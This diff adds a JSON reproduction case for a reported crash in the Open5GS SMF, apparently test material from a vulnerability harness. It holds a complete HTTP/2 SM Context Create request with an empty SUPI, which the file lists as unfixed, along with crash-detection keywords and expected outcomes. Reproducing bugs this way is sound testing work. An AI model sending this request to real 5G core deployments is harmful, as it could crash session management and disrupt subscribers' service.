@@ -1,0 +1,73 @@
+{
+  "schema_version": 1,
+  "id": "open5gs_4532_smf_empty_supi_sm_context_create",
+  "title": "SMF empty SUPI SM Context Create crash",
+  "component": "smf",
+  "protocol": "SBI",
+  "issue": "https://github.com/open5gs/open5gs/issues/4532",
+  "fix": "unfixed-as-of-2026-06-05",
+  "transport": {
+    "scheme": "http",
+    "http2_prior_knowledge": true,
+    "sender_container": "amf"
+  },
+  "target": {
+    "container": "smf",
+    "host": "smf",
+    "port": 7777,
+    "method": "POST",
+    "path": "/nsmf-pdusession/v1/sm-contexts"
+  },
+  "headers": {
+    "Content-Type": "application/json"
+  },
+  "body": {
+    "supi": "",
+    "pduSessionId": 1,
+    "dnn": "internet",
+    "sNssai": {
+      "sst": 1,
+      "sd": "010203"
+    },
+    "servingNfId": "11111111-1111-1111-1111-111111111111",
+    "guami": {
+      "plmnId": {
+        "mcc": "001",
+        "mnc": "01"
+      },
+      "amfId": "020040"
+    },
+    "servingNetwork": {
+      "mcc": "001",
+      "mnc": "01"
+    },
+    "requestType": "INITIAL_REQUEST",
+    "anType": "3GPP_ACCESS",
+    "ratType": "NR",
+    "smContextStatusUri": "http://amf:7777/namf-callback/v1/open5gs-4532/sm-context-status/1"
+  },
+  "detection": {
+    "fatal_keywords": [
+      "FATAL",
+      "abort",
+      "assert",
+      "hash",
+      "supi",
+      "SIGABRT",
+      "SIGSEGV",
+      "backtrace() returned"
+    ]
+  },
+  "expect": {
+    "vulnerable": [
+      "smf_crash",
+      "connection_reset",
+      "fatal_log"
+    ],
+    "fixed_or_safe": [
+      "http_error",
+      "safe_reject",
+      "smf_alive"
+    ]
+  }
+}
